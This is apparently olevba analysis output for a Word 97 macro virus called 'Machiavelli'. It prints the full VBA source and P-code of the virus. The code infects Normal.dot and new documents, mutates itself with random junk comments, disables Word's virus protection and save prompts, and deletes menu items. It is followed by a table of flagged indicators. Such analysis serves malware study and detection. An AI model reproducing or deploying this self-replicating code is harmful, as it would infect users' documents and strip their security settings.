olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mach
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mach - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
Copy
Documents.Save NoPrompt:=True, OriginalFormat:=wdOriginalDocumentFormat
End Sub
Private Sub Document_New()
Pos = ThisDocument.Name
If Pos = NormalTemplate.FullName Then
                                       Copy
                                       If Month(Now) = 12 Then MsgBox "In December of 1513, Niccol?Machiavelli wrote:" + vbCr + vbCr + "Virt?contro a furore" + vbCr + "Prender?l'arme, e fia el combatter corto;" + vbCr + "Ch?l'antico valore" + vbCr + "Nell'italici cor non ?ancor morto." + vbCr + vbCr + "--==<<ITALIAN PoWeR>>==--" + vbCr + vbCr + "MAD T0Y is here!", vbApplicationModal + vbInformation + vbOKOnly + vbSystemModal, "Machiavelli Word 97 Virus Version 0.1?"
End If
End Sub
Private Sub Document_Open()
On Error Resume Next
Deprotect
End Sub
Private Sub Copy()
Pos = ThisDocument.Name
If Pos = NormalTemplate.Name Then
' AKFAHMDDYREPWCUCVXKEC
' LIRIUMRUSZGOSTYJGWWMQ
' YGZAOIGDNLXHUXVACKVV
   Set Start = NormalTemplate.VBProject.VBComponents(1).CodeModule
' OOZ
   Set Target = ActiveDocument.VBProject.VBComponents(1).CodeModule
' YAKPJ
                                   Else
   Set Start = ActiveDocument.VBProject.VBComponents(1).CodeModule
   Set Target = NormalTemplate.VBProject.VBComponents(1).CodeModule
End If
' -=<CoPy>=-
' KYRZACYKZOGEZID
' LMRCAPQGJTXSHFFEH
With Start
' HPKLHUIYXNHSNIPVMMFFTYDSBRD
' BPAHOENGIWQOLVTEPBECIKRBCHM
' JUV
' KLHUBYQGHSGIPOFMZZMRXLVKXFS
' MUDNXUPEJJILDADT
' BDQDJGPO
' QUVZLIXYORAF
' HTDQTRXZGRRWAZNVEOYVQFKKJME
' MWKMUZJQJCQBAPFOHJWJPMVUFQC
' JILX
    VirusCode = .Lines(1, .CountOflines)
End With
' KOPOQJFJYEEMOQLYFBULMWKNUZJ
With Target
' XTRXEMXRWHEUVLVYBXMRRQTEHLA
' BQYOSBF
' QTRXFNRRWIFUVLOYCXNKKJMEIMU
    .DeleteLines 1, .CountOflines
' ZAINYEYREQPDUCWYKYDAJIUERNK
    .InsertLines 1, VirusCode
End With
' JBGJHOWXHINZPDMBFPTNDABACWS
' SMLIRQBTZB
Lines = Start.CountOflines
Randomize Timer
' HUVRJABL
' UHHVZFTDTEOAOTQ
' UQIZ
' TC
NumberOfLines = Int(50 * Rnd) + 1
Delete$ = False
' NGHVZFTCTENUOMJTRCU
ReDim Position(NumberOfLines) As Long, Content(NumberOfLines) As String
' XGQNIYCCBEXUXMTSACD
For A = 1 To NumberOfLines
' NONPIEIXKDLNOKXLATRLVQMTYPP
' VAVUR
    Randomize Timer
    Position(A) = Int(Lines * Rnd) + 1
' PMWUFYCFDJSTDDIVL
    Content(A) = ""
    For B = 1 To 27
' CU
        Randomize Timer
' NNNPHLPXKKSNOKXLA
' ZGRLQBZOPEPSWQGLLKNZBFVAAIK
        Lettera = Int((27 * Rnd) + 64)
        If Lettera = 64 And Content(A) <> "" Then Exit For
        If Lettera = 64 And Content(A) = "" Then Lettera = Lettera + 1
        Content(A) = Content(A) + Chr$(Lettera)
' OQLYMBASMXSNUZQQKKYBIWGWHRX
' E
' QV
' L
' CHZZSLZKQYOXQSEZYVDCOZLOMST
    Next B
' APVVCEGBOWSKBCNADKP
Next A
For A = 1 To NumberOfLines
    If Left$(VBE.SelectedVBComponent.CodeModule.Lines(A, 1), 1) = "'" Then
' KRRZABYKSOGXZIXZGLWCWPCONBS
       VBE.SelectedVBComponent.CodeModule.DeleteLines A, 1
       DeleteBol = True
' XWZRORGUMVXYUGVKC
' A
       Delete = Delete + 1
' MZHNHGCMKWOTWU
       If Delete > NumberOfLines Then Exit For
' JCRBAPFPHJXJPMWUFQCZXCLSDXB
    End If
Next A
' OFGRFHOMDKYYLPWJUJVEREKGQHT
' XCKSCXBNK
' JUGJHNPXHHMSPDLVEOLGWAAACVS
' WQAWRYCUUOHVFMTKTLNAVTQ
If DeleteBol = False Then
   For A = 1 To NumberOfLines
       VBE.SelectedVBComponent.CodeModule.InsertLines Position(A), "' " + Content(A)
' VBASZLLZDJYHXJSESYVDVGZZB
   Next A
End If
End Sub
Private Sub Deprotect()
Options.VirusProtection = False
Options.SaveNormalPrompt = False
CommandBars("Tools").Controls(12).Delete
CommandBars("Tools").Controls(14).Delete
CommandBars("Format").Controls(12).Delete
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Mach
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 8237 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	ArgsCall Copy 0x0000 
' Line #3:
' 	LitVarSpecial (True)
' 	ParamNamed NoPrompt 
' 	Ld wdOriginalDocumentFormat 
' 	ParamNamed OriginalFormat 
' 	Ld Documents 
' 	ArgsMemCall Save 0x0002 
' Line #4:
' 	EndSub 
' Line #5:
' 	FuncDefn (Private Sub Document_New())
' Line #6:
' 	Ld ThisDocument 
' 	MemLd New 
' 	St Pos 
' Line #7:
' 	Ld Pos 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Eq 
' 	IfBlock 
' Line #8:
' 	ArgsCall Copy 0x0000 
' Line #9:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x002E "In December of 1513, Niccol?Machiavelli wrote:"
' 	Ld vbCr 
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x0014 "Virt?contro a furore"
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x0029 "Prender?l'arme, e fia el combatter corto;"
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x0012 "Ch?l'antico valore"
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x0022 "Nell'italici cor non ?ancor morto."
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x0019 "--==<<ITALIAN PoWeR>>==--"
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x0010 "MAD T0Y is here!"
' 	Add 
' 	Ld vbApplicationModal 
' 	Ld vbInformation 
' 	Add 
' 	Ld vbOKOnly 
' 	Add 
' 	Ld vbSystemModal 
' 	Add 
' 	LitStr 0x0026 "Machiavelli Word 97 Virus Version 0.1?"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	EndSub 
' Line #12:
' 	FuncDefn (Private Sub Document_Open())
' Line #13:
' 	OnError (Resume Next) 
' Line #14:
' 	ArgsCall Deprotect 0x0000 
' Line #15:
' 	EndSub 
' Line #16:
' 	FuncDefn (Private Sub Copy())
' Line #17:
' 	Ld ThisDocument 
' 	MemLd New 
' 	St Pos 
' Line #18:
' 	Ld Pos 
' 	Ld NormalTemplate 
' 	MemLd New 
' 	Eq 
' 	IfBlock 
' Line #19:
' 	QuoteRem 0x0000 0x0016 " AKFAHMDDYREPWCUCVXKEC"
' Line #20:
' 	QuoteRem 0x0000 0x0016 " LIRIUMRUSZGOSTYJGWWMQ"
' Line #21:
' 	QuoteRem 0x0000 0x0015 " YGZAOIGDNLXHUXVACKVV"
' Line #22:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Start 
' Line #23:
' 	QuoteRem 0x0000 0x0004 " OOZ"
' Line #24:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Target 
' Line #25:
' 	QuoteRem 0x0000 0x0006 " YAKPJ"
' Line #26:
' 	ElseBlock 
' Line #27:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Start 
' Line #28:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Target 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	QuoteRem 0x0000 0x000B " -=<CoPy>=-"
' Line #31:
' 	QuoteRem 0x0000 0x0010 " KYRZACYKZOGEZID"
' Line #32:
' 	QuoteRem 0x0000 0x0012 " LMRCAPQGJTXSHFFEH"
' Line #33:
' 	StartWithExpr 
' 	Ld Start 
' 	With 
' Line #34:
' 	QuoteRem 0x0000 0x001C " HPKLHUIYXNHSNIPVMMFFTYDSBRD"
' Line #35:
' 	QuoteRem 0x0000 0x001C " BPAHOENGIWQOLVTEPBECIKRBCHM"
' Line #36:
' 	QuoteRem 0x0000 0x0004 " JUV"
' Line #37:
' 	QuoteRem 0x0000 0x001C " KLHUBYQGHSGIPOFMZZMRXLVKXFS"
' Line #38:
' 	QuoteRem 0x0000 0x0011 " MUDNXUPEJJILDADT"
' Line #39:
' 	QuoteRem 0x0000 0x0009 " BDQDJGPO"
' Line #40:
' 	QuoteRem 0x0000 0x000D " QUVZLIXYORAF"
' Line #41:
' 	QuoteRem 0x0000 0x001C " HTDQTRXZGRRWAZNVEOYVQFKKJME"
' Line #42:
' 	QuoteRem 0x0000 0x001C " MWKMUZJQJCQBAPFOHJWJPMVUFQC"
' Line #43:
' 	QuoteRem 0x0000 0x0005 " JILX"
' Line #44:
' 	LitDI2 0x0001 
' 	MemLdWith CountOflines 
' 	ArgsMemLdWith Lines 0x0002 
' 	St VirusCode 
' Line #45:
' 	EndWith 
' Line #46:
' 	QuoteRem 0x0000 0x001C " KOPOQJFJYEEMOQLYFBULMWKNUZJ"
' Line #47:
' 	StartWithExpr 
' 	Ld Target 
' 	With 
' Line #48:
' 	QuoteRem 0x0000 0x001C " XTRXEMXRWHEUVLVYBXMRRQTEHLA"
' Line #49:
' 	QuoteRem 0x0000 0x0008 " BQYOSBF"
' Line #50:
' 	QuoteRem 0x0000 0x001C " QTRXFNRRWIFUVLOYCXNKKJMEIMU"
' Line #51:
' 	LitDI2 0x0001 
' 	MemLdWith CountOflines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #52:
' 	QuoteRem 0x0000 0x001C " ZAINYEYREQPDUCWYKYDAJIUERNK"
' Line #53:
' 	LitDI2 0x0001 
' 	Ld VirusCode 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #54:
' 	EndWith 
' Line #55:
' 	QuoteRem 0x0000 0x001C " JBGJHOWXHINZPDMBFPTNDABACWS"
' Line #56:
' 	QuoteRem 0x0000 0x000B " SMLIRQBTZB"
' Line #57:
' 	Ld Start 
' 	MemLd CountOflines 
' 	St Lines 
' Line #58:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #59:
' 	QuoteRem 0x0000 0x0009 " HUVRJABL"
' Line #60:
' 	QuoteRem 0x0000 0x0010 " UHHVZFTDTEOAOTQ"
' Line #61:
' 	QuoteRem 0x0000 0x0005 " UQIZ"
' Line #62:
' 	QuoteRem 0x0000 0x0003 " TC"
' Line #63:
' 	LitDI2 0x0032 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St NumberOfLines 
' Line #64:
' 	LitVarSpecial (False)
' 	St Delete$ 
' Line #65:
' 	QuoteRem 0x0000 0x0014 " NGHVZFTCTENUOMJTRCU"
' Line #66:
' 	OptionBase 
' 	Ld NumberOfLines 
' 	RedimAs Position 0x0001 (As Long)
' 	OptionBase 
' 	Ld NumberOfLines 
' 	RedimAs Content 0x0001 (As String)
' Line #67:
' 	QuoteRem 0x0000 0x0014 " XGQNIYCCBEXUXMTSACD"
' Line #68:
' 	StartForVariable 
' 	Ld A 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NumberOfLines 
' 	For 
' Line #69:
' 	QuoteRem 0x0000 0x001C " NONPIEIXKDLNOKXLATRLVQMTYPP"
' Line #70:
' 	QuoteRem 0x0000 0x0006 " VAVUR"
' Line #71:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #72:
' 	Ld Lines 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld A 
' 	ArgsSt Position 0x0001 
' Line #73:
' 	QuoteRem 0x0000 0x0012 " PMWUFYCFDJSTDDIVL"
' Line #74:
' 	LitStr 0x0000 ""
' 	Ld A 
' 	ArgsSt Content 0x0001 
' Line #75:
' 	StartForVariable 
' 	Ld B 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001B 
' 	For 
' Line #76:
' 	QuoteRem 0x0000 0x0003 " CU"
' Line #77:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #78:
' 	QuoteRem 0x0000 0x0012 " NNNPHLPXKKSNOKXLA"
' Line #79:
' 	QuoteRem 0x0000 0x001C " ZGRLQBZOPEPSWQGLLKNZBFVAAIK"
' Line #80:
' 	LitDI2 0x001B 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0040 
' 	Add 
' 	FnInt 
' 	St Lettera 
' Line #81:
' 	Ld Lettera 
' 	LitDI2 0x0040 
' 	Eq 
' 	Ld A 
' 	ArgsLd Content 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #82:
' 	Ld Lettera 
' 	LitDI2 0x0040 
' 	Eq 
' 	Ld A 
' 	ArgsLd Content 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld Lettera 
' 	LitDI2 0x0001 
' 	Add 
' 	St Lettera 
' 	EndIf 
' Line #83:
' 	Ld A 
' 	ArgsLd Content 0x0001 
' 	Ld Lettera 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld A 
' 	ArgsSt Content 0x0001 
' Line #84:
' 	QuoteRem 0x0000 0x001C " OQLYMBASMXSNUZQQKKYBIWGWHRX"
' Line #85:
' 	QuoteRem 0x0000 0x0002 " E"
' Line #86:
' 	QuoteRem 0x0000 0x0003 " QV"
' Line #87:
' 	QuoteRem 0x0000 0x0002 " L"
' Line #88:
' 	QuoteRem 0x0000 0x001C " CHZZSLZKQYOXQSEZYVDCOZLOMST"
' Line #89:
' 	StartForVariable 
' 	Ld B 
' 	EndForVariable 
' 	NextVar 
' Line #90:
' 	QuoteRem 0x0000 0x0014 " APVVCEGBOWSKBCNADKP"
' Line #91:
' 	StartForVariable 
' 	Ld A 
' 	EndForVariable 
' 	NextVar 
' Line #92:
' 	StartForVariable 
' 	Ld A 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NumberOfLines 
' 	For 
' Line #93:
' 	Ld A 
' 	LitDI2 0x0001 
' 	Ld VBE 
' 	MemLd SelectedVBComponent 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd LBound$ 0x0002 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	IfBlock 
' Line #94:
' 	QuoteRem 0x0000 0x001C " KRRZABYKSOGXZIXZGLWCWPCONBS"
' Line #95:
' 	Ld A 
' 	LitDI2 0x0001 
' 	Ld VBE 
' 	MemLd SelectedVBComponent 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #96:
' 	LitVarSpecial (True)
' 	St DeleteBol 
' Line #97:
' 	QuoteRem 0x0000 0x0012 " XWZRORGUMVXYUGVKC"
' Line #98:
' 	QuoteRem 0x0000 0x0002 " A"
' Line #99:
' 	Ld Delete 
' 	LitDI2 0x0001 
' 	Add 
' 	St Delete 
' Line #100:
' 	QuoteRem 0x0000 0x000F " MZHNHGCMKWOTWU"
' Line #101:
' 	Ld Delete 
' 	Ld NumberOfLines 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #102:
' 	QuoteRem 0x0000 0x001C " JCRBAPFPHJXJPMWUFQCZXCLSDXB"
' Line #103:
' 	EndIfBlock 
' Line #104:
' 	StartForVariable 
' 	Ld A 
' 	EndForVariable 
' 	NextVar 
' Line #105:
' 	QuoteRem 0x0000 0x001C " OFGRFHOMDKYYLPWJUJVEREKGQHT"
' Line #106:
' 	QuoteRem 0x0000 0x000A " XCKSCXBNK"
' Line #107:
' 	QuoteRem 0x0000 0x001C " JUGJHNPXHHMSPDLVEOLGWAAACVS"
' Line #108:
' 	QuoteRem 0x0000 0x0018 " WQAWRYCUUOHVFMTKTLNAVTQ"
' Line #109:
' 	Ld DeleteBol 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #110:
' 	StartForVariable 
' 	Ld A 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NumberOfLines 
' 	For 
' Line #111:
' 	Ld A 
' 	ArgsLd Position 0x0001 
' 	LitStr 0x0002 "' "
' 	Ld A 
' 	ArgsLd Content 0x0001 
' 	Add 
' 	Ld VBE 
' 	MemLd SelectedVBComponent 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #112:
' 	QuoteRem 0x0000 0x001A " VBASZLLZDJYHXJSESYVDVGZZB"
' Line #113:
' 	StartForVariable 
' 	Ld A 
' 	EndForVariable 
' 	NextVar 
' Line #114:
' 	EndIfBlock 
' Line #115:
' 	EndSub 
' Line #116:
' 	FuncDefn (Private Sub Deprotect())
' Line #117:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #118:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #119:
' 	LitDI2 0x000C 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #120:
' 	LitDI2 0x000E 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #121:
' 	LitDI2 0x000C 
' 	LitStr 0x0006 "Format"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #122:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

